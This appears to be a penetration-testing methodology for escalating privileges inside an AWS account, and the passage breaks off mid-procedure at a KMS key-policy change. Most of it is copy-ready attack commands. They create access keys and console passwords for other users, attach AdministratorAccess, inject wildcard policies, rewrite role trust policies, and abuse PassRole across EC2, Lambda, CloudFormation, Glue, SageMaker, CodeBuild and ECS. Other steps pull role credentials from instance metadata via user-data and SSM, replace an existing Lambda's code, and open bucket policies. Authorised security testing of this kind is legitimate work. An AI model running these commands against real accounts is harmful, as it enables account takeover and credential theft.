Repeatability: per_account
Prerequisites: Valid AWS credentials with partial IAM write permissions (at minimum one of the individual permissions tested below); knowledge of target account ID, usernames, role names, or group names
Description: This methodology tests for privilege escalation within an AWS account by abusing misconfigured or overly permissive IAM policies. An attacker with limited IAM write permissions can leverage one or more of these techniques to elevate privileges up to full AdministratorAccess. The checks cover credential theft, policy manipulation, trust policy abuse, PassRole chaining with compute services, code execution via Lambda/SSM, and resource policy modification. These techniques are largely derived from the Rhino Security Labs IAM privilege escalation research and are implemented in Pacu's iam__privesc_scan module.
Tags: privilege-escalation, iam-abuse, passrole, policy-injection, rhino-security, pacu, credential-theft, lateral-movement, persistence
Potential Severity: critical

------------------------------------------
Procedure 0 — iam:CreateAccessKey on Other Users
Tools: aws cli, Pacu (iam__privesc_scan), PMapper, CloudSplaining
Intrusiveness: high
Description: Tests whether the current principal can create access keys for other IAM users. If successful, the attacker obtains long-term credentials for the target user, inheriting all of that user's permissions. This is a direct credential theft vector.

Step 1: Enumerate all IAM users in the account to identify high-privilege targets.
  aws iam list-users --query "Users[*].[UserName,Arn]" --output table

Step 2: For each target user, check how many access keys already exist (maximum is 2 per user).
  aws iam list-access-keys --user-name <TARGET_USER> --query "AccessKeyMetadata[*].[AccessKeyId,Status]" --output table

Step 3: Attempt to create a new access key for a target user.
  aws iam create-access-key --user-name <TARGET_USER>

Step 4: If successful, validate the stolen credentials by calling sts:GetCallerIdentity.
  AWS_ACCESS_KEY_ID=<NEW_KEY> AWS_SECRET_ACCESS_KEY=<NEW_SECRET> aws sts get-caller-identity

Step 5: Enumerate permissions of the stolen identity.
  AWS_ACCESS_KEY_ID=<NEW_KEY> AWS_SECRET_ACCESS_KEY=<NEW_SECRET> aws iam list-attached-user-policies --user-name <TARGET_USER>
  AWS_ACCESS_KEY_ID=<NEW_KEY> AWS_SECRET_ACCESS_KEY=<NEW_SECRET> aws iam list-user-policies --user-name <TARGET_USER>

Step 6: Run Pacu's privilege escalation scanner to automate detection.
  Pacu> run iam__privesc_scan

Step 7: [DOCUMENT ONLY] After validation, delete the created access key to clean up.
  aws iam delete-access-key --user-name <TARGET_USER> --access-key-id <CREATED_KEY_ID>

Flag: The create-access-key call succeeds and returns a valid AccessKeyId and SecretAccessKey for another user, granting the tester that user's permissions.

------------------------------------------
Procedure 1 — iam:CreateLoginProfile / UpdateLoginProfile for Console Access
Tools: aws cli, Pacu (iam__privesc_scan)
Intrusiveness: high
Description: Tests whether the current principal can create or update a console login profile for another IAM user. This allows setting a known password on a target account, granting the attacker console access as that user.

Step 1: List all IAM users and identify targets without or with existing login profiles.
  aws iam list-users --query "Users[*].UserName" --output text

Step 2: Check if the target user already has a login profile.
  aws iam get-login-profile --user-name <TARGET_USER>

Step 3a: If no login profile exists, attempt to create one with a known password.
  aws iam create-login-profile --user-name <TARGET_USER> --password 'P@ssw0rd!Pentest2026' --no-password-reset-required

Step 3b: If a login profile already exists, attempt to update it with a known password.
  aws iam update-login-profile --user-name <TARGET_USER> --password 'P@ssw0rd!Pentest2026' --no-password-reset-required

Step 4: Validate console access by logging into the AWS Management Console at:
  https://<ACCOUNT_ID>.signin.aws.amazon.com/console
  Username: <TARGET_USER>
  Password: P@ssw0rd!Pentest2026

Step 5: [DOCUMENT ONLY] After validation, revert the change.
  aws iam delete-login-profile --user-name <TARGET_USER>
  (or reset to original state if updating)

Flag: The create-login-profile or update-login-profile call succeeds, and the tester can authenticate to the AWS console as the target user with the newly set password.

------------------------------------------
Procedure 2 — iam:AttachUserPolicy / AttachRolePolicy / AttachGroupPolicy for AdministratorAccess
Tools: aws cli, Pacu (iam__privesc_scan), PMapper, CloudSplaining
Intrusiveness: high
Description: Tests whether the current principal can attach a managed policy (e.g., AdministratorAccess) to a user, role, or group. If successful, the attacker or a controlled identity gains full administrative privileges.

Step 1: Identify the current identity.
  aws sts get-caller-identity

Step 2: Attempt to attach AdministratorAccess to the current user.
  aws iam attach-user-policy --user-name <CURRENT_USER> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

Step 3: If Step 2 fails, attempt to attach AdministratorAccess to a role the attacker can assume.
  aws iam attach-role-policy --role-name <TARGET_ROLE> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

Step 4: If Steps 2–3 fail, identify groups the current user belongs to and attempt attachment there.
  aws iam list-groups-for-user --user-name <CURRENT_USER>
  aws iam attach-group-policy --group-name <GROUP_NAME> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

Step 5: Verify escalation by performing a privileged action.
  aws iam list-users
  aws s3 ls

Step 6: [DOCUMENT ONLY] Detach the policy after validation.
  aws iam detach-user-policy --user-name <CURRENT_USER> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

Flag: Any of the attach-*-policy calls succeeds, and the tester can confirm elevated privileges by executing previously unauthorized API calls.

------------------------------------------
Procedure 3 — iam:PutUserPolicy / PutRolePolicy for Inline Policy Injection
Tools: aws cli, Pacu (iam__privesc_scan), CloudSplaining
Intrusiveness: high
Description: Tests whether the current principal can inject an inline policy granting full privileges into a user or role. Unlike managed policies, inline policies are embedded directly and may bypass policy attachment restrictions.

Step 1: Craft a permissive inline policy document.
  cat > /tmp/privesc-policy.json << 'EOF'
  {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }
    ]
  }
  EOF

Step 2: Attempt to inject the inline policy into the current user.
  aws iam put-user-policy --user-name <CURRENT_USER> --policy-name PentestPrivEsc --policy-document file:///tmp/privesc-policy.json

Step 3: If Step 2 fails, attempt to inject into a role the attacker can assume.
  aws iam put-role-policy --role-name <TARGET_ROLE> --policy-name PentestPrivEsc --policy-document file:///tmp/privesc-policy.json

Step 4: Verify escalation.
  aws iam list-users
  aws ec2 describe-instances --region us-east-1

Step 5: [DOCUMENT ONLY] Remove the injected inline policy after validation.
  aws iam delete-user-policy --user-name <CURRENT_USER> --policy-name PentestPrivEsc

Flag: The put-user-policy or put-role-policy call succeeds, and the tester can verify unrestricted access through the injected Allow * policy.

------------------------------------------
Procedure 4 — iam:CreatePolicyVersion / SetDefaultPolicyVersion to Escalate via Policy Update
Tools: aws cli, Pacu (iam__privesc_scan), CloudSplaining
Intrusiveness: high
Description: Tests whether the current principal can create a new version of an existing customer-managed policy and set it as the default. By replacing the policy document with Allow *, any principal that policy is attached to gains full privileges. AWS retains up to 5 policy versions, so an existing version may need to be deleted first.

Step 1: List customer-managed policies attached to the current user, groups, or roles.
  aws iam list-attached-user-policies --user-name <CURRENT_USER>
  aws iam list-attached-group-policies --group-name <GROUP_NAME>

Step 2: Identify a customer-managed policy ARN (not AWS-managed) and list its versions.
  aws iam list-policy-versions --policy-arn <POLICY_ARN>

Step 3: If 5 versions already exist, delete the oldest non-default version.
  aws iam delete-policy-version --policy-arn <POLICY_ARN> --version-id <OLD_VERSION_ID>

Step 4: Create a new policy version with full privileges and set it as default.
  aws iam create-policy-version --policy-arn <POLICY_ARN> --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --set-as-default

Step 5: Verify escalation.
  aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id <NEW_VERSION_ID>
  aws s3 ls

Step 6: Alternatively, if create-policy-version is denied but set-default-policy-version is allowed, check if an older permissive version exists and activate it.
  aws iam set-default-policy-version --policy-arn <POLICY_ARN> --version-id <PERMISSIVE_VERSION_ID>

Step 7: [DOCUMENT ONLY] Restore the original default version and delete the attacker version.
  aws iam set-default-policy-version --policy-arn <POLICY_ARN> --version-id <ORIGINAL_VERSION_ID>
  aws iam delete-policy-version --policy-arn <POLICY_ARN> --version-id <ATTACKER_VERSION_ID>

Flag: The create-policy-version (with --set-as-default) or set-default-policy-version call succeeds, and the effective permissions of the policy are elevated to Allow *.

------------------------------------------
Procedure 5 — iam:AddUserToGroup for Privilege Escalation via Group Membership
Tools: aws cli, Pacu (iam__privesc_scan), PMapper
Intrusiveness: high
Description: Tests whether the current principal can add itself (or another controlled user) to a privileged IAM group such as Admins or Administrators. Group membership grants all policies attached to that group.

Step 1: List all IAM groups and their attached policies to identify privileged groups.
  aws iam list-groups --query "Groups[*].GroupName" --output text
  for group in $(aws iam list-groups --query "Groups[*].GroupName" --output text); do echo "--- $group ---"; aws iam list-attached-group-policies --group-name $group --output table; done

Step 2: Identify high-value groups (e.g., those with AdministratorAccess or broad IAM permissions).

Step 3: Attempt to add the current user to the privileged group.
  aws iam add-user-to-group --user-name <CURRENT_USER> --group-name <PRIVILEGED_GROUP>

Step 4: Verify the user is now a member of the group.
  aws iam list-groups-for-user --user-name <CURRENT_USER>

Step 5: Verify escalation by performing a privileged action.
  aws iam list-users
  aws s3 ls

Step 6: [DOCUMENT ONLY] Remove the user from the group after validation.
  aws iam remove-user-from-group --user-name <CURRENT_USER> --group-name <PRIVILEGED_GROUP>

Flag: The add-user-to-group call succeeds, and the tester inherits the elevated permissions of the privileged group.

------------------------------------------
Procedure 6 — iam:UpdateAssumeRolePolicy to Modify Trust Policy
Tools: aws cli, Pacu (iam__privesc_scan), PMapper
Intrusiveness: high
Description: Tests whether the current principal can modify the trust policy (assume role policy) of an existing IAM role to allow the attacker's identity to assume it. This is a powerful escalation path because many high-privilege roles exist but have restrictive trust policies.

Step 1: List all IAM roles and identify high-privilege targets.
  aws iam list-roles --query "Roles[*].[RoleName,Arn]" --output table

Step 2: For promising roles, check their attached policies to confirm high privilege.
  aws iam list-attached-role-policies --role-name <TARGET_ROLE>
  aws iam list-role-policies --role-name <TARGET_ROLE>

Step 3: Retrieve the current trust policy for documentation/rollback.
  aws iam get-role --role-name <TARGET_ROLE> --query "Role.AssumeRolePolicyDocument"

Step 4: Craft a modified trust policy that allows the attacker's identity to assume the role.
  cat > /tmp/trust-policy.json << EOF
  {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {
          "AWS": "arn:aws:iam::<ACCOUNT_ID>:user/<CURRENT_USER>"
        },
        "Action": "sts:AssumeRole"
      }
    ]
  }
  EOF

Step 5: Attempt to update the trust policy.
  aws iam update-assume-role-policy --role-name <TARGET_ROLE> --policy-document file:///tmp/trust-policy.json

Step 6: Assume the role and verify elevated privileges.
  aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT_ID>:role/<TARGET_ROLE> --role-session-name privesc-test
  (export the returned credentials and test access)

Step 7: [DOCUMENT ONLY] Restore the original trust policy after validation.
  aws iam update-assume-role-policy --role-name <TARGET_ROLE> --policy-document file:///tmp/original-trust-policy.json

Flag: The update-assume-role-policy call succeeds, and the tester can successfully assume the target role and inherit its permissions.

------------------------------------------
Procedure 7 — iam:PassRole + ec2:RunInstances for Instance with Privileged Role
Tools: aws cli, Pacu (iam__privesc_scan)
Intrusiveness: high
Description: Tests whether the current principal can pass a privileged IAM role to a new EC2 instance. The attacker launches an instance with the target role attached, then accesses the instance metadata service (IMDS) to retrieve temporary credentials for that role.

Step 1: Identify high-privilege instance profiles/roles.
  aws iam list-instance-profiles --query "InstanceProfiles[*].[InstanceProfileName,Roles[0].RoleName,Roles[0].Arn]" --output table

Step 2: Identify a suitable AMI, subnet, and security group.
  aws ec2 describe-images --owners amazon --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" --query "Images | sort_by(@, &CreationDate)[-1].ImageId" --output text
  aws ec2 describe-subnets --query "Subnets[0].SubnetId" --output text
  aws ec2 describe-security-groups --query "SecurityGroups[0].GroupId" --output text

Step 3: Create a user-data script that exfiltrates role credentials (for validation only).
  cat > /tmp/userdata.sh << 'EOF'
  #!/bin/bash
  TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
  ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
  CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)
  echo "$CREDS" > /tmp/creds.json
  EOF

Step 4: Launch the instance with the privileged instance profile.
  aws ec2 run-instances \
    --image-id <AMI_ID> \
    --instance-type t2.micro \
    --iam-instance-profile Name=<INSTANCE_PROFILE_NAME> \
    --subnet-id <SUBNET_ID> \
    --security-group-ids <SG_ID> \
    --user-data file:///tmp/userdata.sh \
    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=pentest-privesc}]'

Step 5: Once the instance is running, connect via SSM or SSH and retrieve the role credentials from IMDS.
  aws ssm start-session --target <INSTANCE_ID>
  curl -s -H "X-aws-ec2-metadata-token: $(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

Step 6: [DOCUMENT ONLY] Terminate the instance after validation.
  aws ec2 terminate-instances --instance-ids <INSTANCE_ID>

Flag: The run-instances call succeeds with the privileged instance profile attached, and the tester can retrieve role credentials from the instance metadata service.

------------------------------------------
Procedure 8 — iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction for Code Execution
Tools: aws cli, Pacu (iam__privesc_scan)
Intrusiveness: high
Description: Tests whether the current principal can create a Lambda function with a privileged execution role and invoke it. The Lambda function runs with the permissions of the attached role, allowing arbitrary API calls at that privilege level.

Step 1: Identify high-privilege IAM roles that have a trust policy allowing lambda.amazonaws.com.
  for role in $(aws iam list-roles --query "Roles[*].RoleName" --output text); do
    trust=$(aws iam get-role --role-name $role --query "Role.AssumeRolePolicyDocument" --output text 2>/dev/null)
    if echo "$trust" | grep -q "lambda.amazonaws.com"; then
      echo "Lambda-assumable role: $role"
      aws iam list-attached-role-policies --role-name $role --output table
    fi
  done

Step 2: Create a Lambda function payload that exfiltrates its own credentials.
  mkdir -p /tmp/lambda-privesc
  cat > /tmp/lambda-privesc/lambda_function.py << 'EOF'
  import boto3
  import json
  def lambda_handler(event, context):
      sts = boto3.client('sts')
      identity = sts.get_caller_identity()
      iam = boto3.client('iam')
      try:
          users = iam.list_users()['Users']
          user_list = [u['UserName'] for u in users]
      except Exception as e:
          user_list = str(e)
      return {
          'statusCode': 200,
          'identity': identity,
          'users': user_list
      }
  EOF
  cd /tmp/lambda-privesc && zip function.zip lambda_function.py

Step 3: Create the Lambda function with the privileged role.
  aws lambda create-function \
    --function-name pentest-privesc-lambda \
    --runtime python3.12 \
    --role arn:aws:iam::<ACCOUNT_ID>:role/<PRIVILEGED_ROLE> \
    --handler lambda_function.lambda_handler \
    --zip-file fileb:///tmp/lambda-privesc/function.zip \
    --timeout 30

Step 4: Invoke the function and examine the output.
  aws lambda invoke --function-name pentest-privesc-lambda /tmp/lambda-output.json
  cat /tmp/lambda-output.json

Step 5: [DOCUMENT ONLY] Delete the Lambda function after validation.
  aws lambda delete-function --function-name pentest-privesc-lambda

Flag: The Lambda function is created with the privileged role, invocation succeeds, and the function output confirms it is operating with the elevated permissions of the target role.

------------------------------------------
Procedure 9 — iam:PassRole + cloudformation:CreateStack for Privileged Stack Deployment
Tools: aws cli, Pacu (iam__privesc_scan)
Intrusiveness: high
Description: Tests whether the current principal can create a CloudFormation stack that uses a privileged IAM role. CloudFormation creates resources using the permissions of the specified role, so an attacker can provision resources or make API calls that their own credentials cannot.

Step 1: Identify IAM roles with a trust policy for cloudformation.amazonaws.com.
  for role in $(aws iam list-roles --query "Roles[*].RoleName" --output text); do
    trust=$(aws iam get-role --role-name $role --query "Role.AssumeRolePolicyDocument" --output text 2>/dev/null)
    if echo "$trust" | grep -q "cloudformation.amazonaws.com"; then
      echo "CF-assumable role: $role"
    fi
  done

Step 2: Create a CloudFormation template that creates an admin user (for validation).
  cat > /tmp/cfn-privesc.yaml << 'EOF'
  AWSTemplateFormatVersion: '2010-09-09'
  Description: Privesc test stack
  Resources:
    PentestUser:
      Type: AWS::IAM::User
      Properties:
        UserName: pentest-cfn-privesc-user
        ManagedPolicyArns:
          - arn:aws:iam::aws:policy/AdministratorAccess
    PentestKey:
      Type: AWS::IAM::AccessKey
      Properties:
        UserName: !Ref PentestUser
  Outputs:
    AccessKeyId:
      Value: !Ref PentestKey
    SecretAccessKey:
      Value: !GetAtt PentestKey.SecretAccessKey
  EOF

Step 3: Create the CloudFormation stack with the privileged role.
  aws cloudformation create-stack \
    --stack-name pentest-privesc-stack \
    --template-body file:///tmp/cfn-privesc.yaml \
    --role-arn arn:aws:iam::<ACCOUNT_ID>:role/<CF_ROLE> \
    --capabilities CAPABILITY_NAMED_IAM

Step 4: Wait for stack creation and retrieve outputs.
  aws cloudformation wait stack-create-complete --stack-name pentest-privesc-stack
  aws cloudformation describe-stacks --stack-name pentest-privesc-stack --query "Stacks[0].Outputs"

Step 5: [DOCUMENT ONLY] Delete the stack and created resources after validation.
  aws cloudformation delete-stack --stack-name pentest-privesc-stack

Flag: The CloudFormation stack is created successfully using the privileged role, and the stack provisions resources or outputs that confirm privilege escalation (e.g., admin user credentials).

------------------------------------------
Procedure 10 — iam:PassRole + glue:CreateDevEndpoint for Glue Endpoint Abuse
Tools: aws cli, Pacu (iam__privesc_scan)
Intrusiveness: high
Description: Tests whether the current principal can create an AWS Glue development endpoint with a privileged IAM role attached. The attacker can then SSH into the Glue endpoint and use the role's credentials for arbitrary API calls. Note that Glue Dev Endpoints are a legacy feature and may not be available in all regions.

Step 1: Identify IAM roles with a trust policy for glue.amazonaws.com.
  for role in $(aws iam list-roles --query "Roles[*].RoleName" --output text); do
    trust=$(aws iam get-role --role-name $role --query "Role.AssumeRolePolicyDocument" --output text 2>/dev/null)
    if echo "$trust" | grep -q "glue.amazonaws.com"; then
      echo "Glue-assumable role: $role"
      aws iam list-attached-role-policies --role-name $role --output table
    fi
  done

Step 2: Generate an SSH key pair for endpoint access.
  ssh-keygen -t rsa -b 2048 -f /tmp/glue-privesc-key -N ""

Step 3: Attempt to create a Glue development endpoint with the privileged role.
  aws glue create-dev-endpoint \
    --endpoint-name pentest-privesc-glue \
    --role-arn arn:aws:iam::<ACCOUNT_ID>:role/<GLUE_ROLE> \
    --public-key file:///tmp/glue-privesc-key.pub \
    --number-of-nodes 2

Step 4: Wait for the endpoint to become READY and retrieve connection details.
  aws glue get-dev-endpoint --endpoint-name pentest-privesc-glue

Step 5: SSH into the endpoint and retrieve role credentials from the instance metadata.
  ssh -i /tmp/glue-privesc-key glue@<ENDPOINT_PUBLIC_ADDRESS>
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

Step 6: [DOCUMENT ONLY] Delete the endpoint after validation.
  aws glue delete-dev-endpoint --endpoint-name pentest-privesc-glue

Flag: The Glue development endpoint is created with the privileged role, and the tester can access role credentials via the endpoint.

------------------------------------------
Procedure 11 — iam:PassRole + sagemaker:CreateNotebookInstance for SageMaker Abuse
Tools: aws cli, Pacu (iam__privesc_scan)
Intrusiveness: high
Description: Tests whether the current principal can create a SageMaker notebook instance with a privileged IAM role. The notebook environment provides a Jupyter interface where the attacker can execute code using the role's credentials.

Step 1: Identify IAM roles with a trust policy for sagemaker.amazonaws.com.
  for role in $(aws iam list-roles --query "Roles[*].RoleName" --output text); do
    trust=$(aws iam get-role --role-name $role --query "Role.AssumeRolePolicyDocument" --output text 2>/dev/null)
    if echo "$trust" | grep -q "sagemaker.amazonaws.com"; then
      echo "SageMaker-assumable role: $role"
      aws iam list-attached-role-policies --role-name $role --output table
    fi
  done

Step 2: Attempt to create a SageMaker notebook instance with the privileged role.
  aws sagemaker create-notebook-instance \
    --notebook-instance-name pentest-privesc-notebook \
    --instance-type ml.t2.medium \
    --role-arn arn:aws:iam::<ACCOUNT_ID>:role/<SAGEMAKER_ROLE> \
    --direct-internet-access Enabled

Step 3: Wait for the notebook to become InService.
  aws sagemaker wait notebook-instance-in-service --notebook-instance-name pentest-privesc-notebook

Step 4: Create a presigned URL and access the Jupyter notebook.
  aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name pentest-privesc-notebook

Step 5: Open the presigned URL in a browser, create a new notebook, and execute:
  import boto3
  sts = boto3.client('sts')
  print(sts.get_caller_identity())
  iam = boto3.client('iam')
  print(iam.list_users())

Step 6: [DOCUMENT ONLY] Stop and delete the notebook instance after validation.
  aws sagemaker stop-notebook-instance --notebook-instance-name pentest-privesc-notebook
  aws sagemaker delete-notebook-instance --notebook-instance-name pentest-privesc-notebook

Flag: The SageMaker notebook instance is created with the privileged role, and code executed within the notebook confirms the elevated identity and permissions.

------------------------------------------
Procedure 12 — iam:PassRole + codebuild:CreateProject + codebuild:StartBuild
Tools: aws cli, Pacu (iam__privesc_scan)
Intrusiveness: high
Description: Tests whether the current principal can create a CodeBuild project with a privileged service role and start a build. The build environment runs with the role's permissions, allowing arbitrary command execution and API calls.

Step 1: Identify IAM roles with a trust policy for codebuild.amazonaws.com.
  for role in $(aws iam list-roles --query "Roles[*].RoleName" --output text); do
    trust=$(aws iam get-role --role-name $role --query "Role.AssumeRolePolicyDocument" --output text 2>/dev/null)
    if echo "$trust" | grep -q "codebuild.amazonaws.com"; then
      echo "CodeBuild-assumable role: $role"
      aws iam list-attached-role-policies --role-name $role --output table
    fi
  done

Step 2: Create a buildspec that calls sts:GetCallerIdentity and iam:ListUsers for verification.
  cat > /tmp/buildspec.yml << 'EOF'
  version: 0.2
  phases:
    build:
      commands:
        - aws sts get-caller-identity
        - aws iam list-users
        - echo "Privilege escalation confirmed"
  EOF

Step 3: Create the CodeBuild project with the privileged role.
  aws codebuild create-project \
    --name pentest-privesc-codebuild \
    --source type=NO_SOURCE,buildspec="$(cat /tmp/buildspec.yml)" \
    --artifacts type=NO_ARTIFACTS \
    --environment type=LINUX_CONTAINER,image=aws/codebuild/amazonlinux2-x86_64-standard:4.0,computeType=BUILD_GENERAL1_SMALL \
    --service-role arn:aws:iam::<ACCOUNT_ID>:role/<CODEBUILD_ROLE>

Step 4: Start a build and monitor the output.
  aws codebuild start-build --project-name pentest-privesc-codebuild
  aws codebuild batch-get-builds --ids <BUILD_ID> --query "builds[0].buildStatus"

Step 5: Retrieve build logs to confirm privileged API calls succeeded.
  aws logs get-log-events --log-group-name /aws/codebuild/pentest-privesc-codebuild --log-stream-name <LOG_STREAM>

Step 6: [DOCUMENT ONLY] Delete the project after validation.
  aws codebuild delete-project --name pentest-privesc-codebuild

Flag: The CodeBuild project is created with the privileged role, the build completes successfully, and build logs confirm the build ran with elevated permissions.

------------------------------------------
Procedure 13 — iam:PassRole + ecs:RunTask / datapipeline / autoscaling
Tools: aws cli, Pacu (iam__privesc_scan)
Intrusiveness: high
Description: Tests whether the current principal can leverage iam:PassRole with ECS (RunTask/RegisterTaskDefinition), Data Pipeline, or Auto Scaling to execute workloads under a privileged IAM role. These are less common but valid escalation paths.

Step 1 (ECS): Identify ECS clusters and task execution roles.
  aws ecs list-clusters
  aws iam list-roles --query "Roles[?contains(AssumeRolePolicyDocument | to_string(@), 'ecs-tasks.amazonaws.com')].[RoleName,Arn]" --output table

Step 2 (ECS): Register a task definition with the privileged role.
  cat > /tmp/ecs-task-def.json << 'EOF'
  {
    "family": "pentest-privesc-task",
    "taskRoleArn": "arn:aws:iam::<ACCOUNT_ID>:role/<PRIVILEGED_ROLE>",
    "containerDefinitions": [
      {
        "name": "privesc-container",
        "image": "amazon/aws-cli:latest",
        "command": ["sts", "get-caller-identity"],
        "essential": true,
        "memory": 256
      }
    ]
  }
  EOF
  aws ecs register-task-definition --cli-input-json file:///tmp/ecs-task-def.json

Step 3 (ECS): Run the task on an existing cluster.
  aws ecs run-task --cluster <CLUSTER_ARN> --task-definition pentest-privesc-task --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[<SUBNET_ID>],securityGroups=[<SG_ID>],assignPublicIp=ENABLED}"

Step 4 (Data Pipeline): Check if the attacker can create a pipeline with a privileged role.
  aws datapipeline create-pipeline --name pentest-privesc-pipeline --unique-id pentest-privesc-001

Step 5 (Auto Scaling): Check if a launch configuration or launch template can be created with a privileged instance profile.
  aws autoscaling create-launch-configuration \
    --launch-configuration-name pentest-privesc-lc \
    --image-id <AMI_ID> \
    --instance-type t2.micro \
    --iam-instance-profile <PRIVILEGED_INSTANCE_PROFILE>

Step 6: [DOCUMENT ONLY] Clean up all created resources.
  aws ecs deregister-task-definition --task-definition pentest-privesc-task:1
  aws datapipeline delete-pipeline --pipeline-id <PIPELINE_ID>
  aws autoscaling delete-launch-configuration --launch-configuration-name pentest-privesc-lc

Flag: Any of the above service integrations succeeds in running a workload or creating a resource with the privileged role attached, and the tester can confirm the workload operates with elevated permissions.

------------------------------------------
Procedure 14 — lambda:UpdateFunctionCode / UpdateFunctionConfiguration for Existing Lambda Abuse
Tools: aws cli, Pacu (iam__privesc_scan)
Intrusiveness: high
Description: Tests whether the current principal can modify the code or configuration of an existing Lambda function. If the function has a privileged execution role, injecting code allows the attacker to execute arbitrary API calls at that privilege level without needing iam:PassRole.

Step 1: List all Lambda functions and identify those with privileged execution roles.
  aws lambda list-functions --query "Functions[*].[FunctionName,Role]" --output table

Step 2: For each function with a privileged role, check the role's attached policies.
  aws iam list-attached-role-policies --role-name <ROLE_FROM_LAMBDA>

Step 3: Create a malicious payload to replace the function code.
  mkdir -p /tmp/lambda-inject
  cat > /tmp/lambda-inject/lambda_function.py << 'EOF'
  import boto3
  import json
  def lambda_handler(event, context):
      sts = boto3.client('sts')
      identity = sts.get_caller_identity()
      iam = boto3.client('iam')
      try:
          users = iam.list_users()['Users']
          user_list = [u['UserName'] for u in users]
      except Exception as e:
          user_list = str(e)
      return {'identity': identity, 'users': user_list}
  EOF
  cd /tmp/lambda-inject && zip function.zip lambda_function.py

Step 4: Update the function code.
  aws lambda update-function-code --function-name <TARGET_FUNCTION> --zip-file fileb:///tmp/lambda-inject/function.zip

Step 5: Alternatively, update the function configuration to change the handler or add environment variables for persistence.
  aws lambda update-function-configuration --function-name <TARGET_FUNCTION> --handler lambda_function.lambda_handler

Step 6: Invoke the function and verify elevated permissions.
  aws lambda invoke --function-name <TARGET_FUNCTION> /tmp/lambda-inject-output.json
  cat /tmp/lambda-inject-output.json

Step 7: [DOCUMENT ONLY] Restore the original function code from backup after validation.

Flag: The function code or configuration is updated successfully, and invocation confirms the function now runs attacker-controlled code with the privileged execution role's permissions.

------------------------------------------
Procedure 15 — ssm:SendCommand / StartSession for RCE on EC2 via Instance Role
Tools: aws cli, Pacu (iam__privesc_scan)
Intrusiveness: high
Description: Tests whether the current principal can use AWS Systems Manager (SSM) to execute commands on or start interactive sessions with EC2 instances that have privileged IAM roles attached. This does not require iam:PassRole since the role is already attached to the target instance.

Step 1: List EC2 instances and their attached IAM instance profiles.
  aws ec2 describe-instances --query "Reservations[*].Instances[*].[InstanceId,IamInstanceProfile.Arn,State.Name]" --output table

Step 2: Identify instances managed by SSM.
  aws ssm describe-instance-information --query "InstanceInformationList[*].[InstanceId,PlatformType,IPAddress]" --output table

Step 3: Cross-reference to find SSM-managed instances with privileged roles.

Step 4: Attempt to send a command to a target instance to retrieve role credentials.
  aws ssm send-command \
    --instance-ids <INSTANCE_ID> \
    --document-name "AWS-RunShellScript" \
    --parameters 'commands=["TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\") && ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/) && curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"]'

Step 5: Retrieve the command output.
  aws ssm get-command-invocation --command-id <COMMAND_ID> --instance-id <INSTANCE_ID> --query "StandardOutputContent"

Step 6: Alternatively, start an interactive session for direct shell access.
  aws ssm start-session --target <INSTANCE_ID>

Step 7: Within the session, retrieve role credentials.
  TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
  ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
  curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

Flag: The ssm:SendCommand or ssm:StartSession call succeeds against an instance with a privileged role, and the tester can retrieve or use the instance role credentials.

------------------------------------------
Procedure 16 — Resource Policy Modification (S3, KMS, Secrets Manager, Lambda)
Tools: aws cli, Pacu, CloudSplaining
Intrusiveness: high
Description: Tests whether the current principal can modify resource-based policies on services like S3, KMS, Secrets Manager, or Lambda to grant itself (or an external account) direct access. Unlike identity-based policies, resource policies are attached directly to the resource and can override identity-level restrictions.

Step 1 (S3): List S3 buckets and attempt to modify a bucket policy to grant access.
  aws s3api list-buckets --query "Buckets[*].Name" --output text
  aws s3api get-bucket-policy --bucket <BUCKET_NAME>
  cat > /tmp/s3-policy.json << EOF
  {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "PentestAccess",
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::<ACCOUNT_ID>:user/<CURRENT_USER>"},
        "Action": "s3:*",
        "Resource": ["arn:aws:s3:::<BUCKET_NAME>", "arn:aws:s3:::<BUCKET_NAME>/*"]
      }
    ]
  }
  EOF
  aws s3api put-bucket-policy --bucket <BUCKET_NAME> --policy file:///tmp/s3-policy.json

Step 2 (KMS): List KMS keys and attempt to modify a key policy.
  aws kms list-keys --query "Keys[*].KeyId" --output text
  aws kms get-key-policy --key-id <KEY_ID> --policy-name default
  aws kms put-key-policy --key-id <KEY_ID> --policy-name default --policy '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "PentestAccess",
        "Effect": "Allow",
